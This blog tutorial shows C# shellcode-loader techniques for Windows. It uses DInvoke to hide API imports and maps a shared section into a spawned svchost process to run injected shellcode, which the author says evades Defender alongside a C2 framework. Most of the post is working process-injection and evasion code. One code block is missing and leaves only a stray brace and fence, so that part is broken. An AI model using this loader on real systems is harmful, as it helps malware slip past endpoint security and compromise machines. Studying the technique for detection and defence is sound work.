It's been a month since my first part to this "series", and now I'm getting more familiarized with this stuff. Last post covered Platform Invoke (Pinvoke), Remote Process Injection, and Donut. This post will focus on taking these techniques to the next level with the following: Dynamic Invocation (Dinvoke) and "Section Injection".

## Dinvoke
Dinvoke is created by TheWover, who also made Donut. His <a href="https://thewover.github.io/Introducing-Donut/">blog post</a> covers the tool in a very technical depth, so I'll only be explaining our use case for it here. Basically, the issue with Pinvoke is that its usage creates signatures on our executables; the IAT (Import Address Table) will show all of the unmanaged functions/Win32 API calls we're importing. This makes it easily detectable by AV or EDRs. We will go into avoiding hooking into the next part of this series; for now, we take one step at a time.

So how does usage of Dinvoke help us avoid this? Dinvoke, as its name implies, it dynamically will access the unmanaged code to provide us a way to use the unmanaged function without statically importing as with Pinvoke. Dinvoke provides many ways to do this, but we will focus on its `DynamicAPIInvoke` function for our use case. This function will search to see if the necessary DLL is loaded in the process and will load it if it isn't. Then, it finds our unmanaged function within the dll. Dinvoke can then utilize a delegate to call the unmanaged Win32 APIs. A delegate is pretty similar to a function pointer and we will use it similarly in our case. Let's use a simple example; accessing the Win32 API call, `Sleep` from `Kernel32.dll` without Pinvoke. To help with evasion, I will utilize <a href="https://github.com/rasta-mouse/DInvoke">rasta-mouse's  repo</a> which provides the core Dinvoke libraries so we have less of a static signature.

```csharp
using System.Runtime.InteropServices;

namespace Dinvoke
{
	public class Delegates
	{
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void Sleep(uint ms);
	}
}
```
Here we declare our delegate which we will use as a pointer a function within unmanaged code; in this case, the `Sleep` function within `Kernel32.dll`. The directive above the delegate declaration is called an `attribute` and, according to <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.unmanagedfunctionpointerattribute?view=net-6.0">Microsoft Documentation</a>, it helps repurpose this delegate to be used as a function pointer to unmanaged code. Within our Main function of our code, we will add these lines:
```csharp
IntPtr pointer = DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "Sleep");
Delegates.Sleep dinvokeMarshalSleep = Marshal.GetDelegateForFunctionPointer(pointer, typeof(Delegates.Sleep)) as Delegates.Sleep;
dinvokeMarshalSleep(1000);
```
The first line will grab a pointer to the `Sleep` function within `kernel32.dll`, while the second one creates an instance of our `Sleep` delegate. The `Marshal.GetDelegateforFunctionPointer` function returns a delegate that will point to a function written in unmanaged code; it will use our `pointer` variable to determine which the location of the function this delegate points to. Additionally, it is using our `Sleep` delegate as a function prototype so we can pass in our managed code arguments to the function in unmanaged code smoothly. This process can also be done like this:
```csharp
	static void dinvokeDynamicSleep(uint ms)
	{
		object[] funcargs = { ms };
		DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "Sleep", typeof(Delegates.Sleep), ref funcargs);
	}
	dinvokeDynamicSleep(1000);
```
The `DynamicInvoke.Generic.DynamicApiInvoke` function actually does the whole `GetLibraryAddress` and `Marshal.GetDelegateForFunctionPointer` for us, but its up to you which implementation you feel like using.

## "Section Injection"
I call this "Section Injection" because I couldn't find any sort of official name on the technique, but it still falls under Process Injection. According to <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views">Microsoft documentation</a>, `sections` are literal sections of memory that can be shared between processes and can be used by processes to share memory with other processes. Sections have `views`, which is the visible part of the section to other processes, and creating a view is called `mapping` a view of the section. This can be performed through using the Native ApIs  `NtCreateSection` and `NtMapViewOfSection`. Native API are actually what the Win32 APIs call on internally. We'll also need  `CreateProcess`  to create a process and `CreateRemoteThread` to create a thread that will trigger the shellcode in the view of our section.

## Piecing it Together
We'll start off by creating our delegates and function wrappers for the delegates (I'm going with the `DynamicInvoke.Generic.DynamicApiInvoke`  approach. The dataypes for the arguments I used in the delegates were based on the Pinvoke entries. Also, the `Structs` class is omitted since it is very long (it's just a bunch of constant values and datatypes), but I'll include the full code at the end.

}
```
The first few lines of the main function instantiate some datatypes. We will then use `CreateProcess` to create a svchost process that will update this data; this data will now contain information about the process we created. Some things to note: we won't have to create delegates for the Native APIs that we are using because rasta-mouse's repo and the entire Dinvoke library itself already have them implemented. Also, the values being set at the end of some of my delegate wrappers `CreateProcess` and `CreateRemoteThread`   are necessary because the respective delegates update the variable being passed in, but since an object array that contains copies of the values are being passed in, the actual value is never updated. Next, add the following to the `Main`  function
```

 IntPtr sectionHandle = IntPtr.Zero;
 ulong maxSize = (uint)buf.Length;
 uint SECTION_ALL_ACCESS = 0x0F001F;
 uint PAGE_EXECUTE_READWRITE = 0x40;
 uint SEC_COMMIT = 0x8000000;
 DynamicInvoke.Native.NtCreateSection(ref sectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
```
We'll need a pointer that can be used to point to the location of the section, so we'll use `sectionHandle`. The `maxSize` is the max size of the section; we'll just use our payload size. The other values are constants that will give the section certain properties. The value of `SECTION_ALL_ACCESS` is an ACCESS_MASK value gives full access to anybody accessing this section (we'll need this since we plan to make another process access this section). `PAGE_EXECUTE_READWRITE` will make the memory pages in this section read, write, and executable. `SEC_COMMIT` will apply these properties to the section. The other values are `IntPtr.Zero`  as a default value. For more information, view the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection"> Microsoft Documentation</a>. Next, add the following:
```csharp
IntPtr hlocalBaseAddress = IntPtr.Zero;
IntPtr hRemoteBaseAddress = IntPtr.Zero;
uint PAGE_READWRITE = 0x04;
uint PAGE_EXECUTE_READ = 0x20;
DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, ref hlocalBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxSize, 2, 0, PAGE_READWRITE); 
DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, pi.hProcess, ref hRemoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxSize, 2, 0, PAGE_EXECUTE_READ);     
```
These lines will map views onto our section, or basically grant access to this section to our process and the other we created. We will need a pointer to the location where the view is mapped for both local and remote process, so we declare pointers in the first two lines. The third line uses the `sectionHandle` variable to find which section it will map a view on. It then maps this view for our current process and will use `hlocalBaseAddress` to store the location of this new view. We'll declare some default values with `IntPtr.Zero` , use the `maxSize`  variable to dictate how large the view will be, specify `2` so that the view won't be mapped into child processes, and we'll specify `PAGE_READWRITE`  because we won't be executed the shellcode from this view. For making the view on the remote process, its mostly the same except we'll pass in parameters related to the remote process, such as the handle. However, it will utilize `PAGE_EXECUTE_READ`  since we'll be executing shellcode from this view. Next we'll add:
```
IntPtr lpThreadId = IntPtr.Zero;
Marshal.Copy(buf, 0, hlocalBaseAddress, buf.Length);
CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, hRemoteBaseAddress, IntPtr.Zero, 0, out lpThreadId);
```
We'll use `Marshal.Copy` to write our shellcode into our view, and since views of the sections are shared, the view on the remote process will have the same shellcode written in. We can then create a thread on that process to execute our code. The full code (excluding the imported code from rasta-mouse's repo) is shown below, along with a demo.

## Conclusion
Overalls, learning how to take improve my evasion tradecraft has been pretty fun but daunting. Theres much more to Dinvoke to explore, so I'll eventually write up more findings. As for now, I've been testing it with Mythic C2 and an embedded, base64 encoded donut shellcode file and have been successful at evading Defender, so thats pretty cool. It's not too complicated, so you guys can probably figure out how to get there from what was shown here.
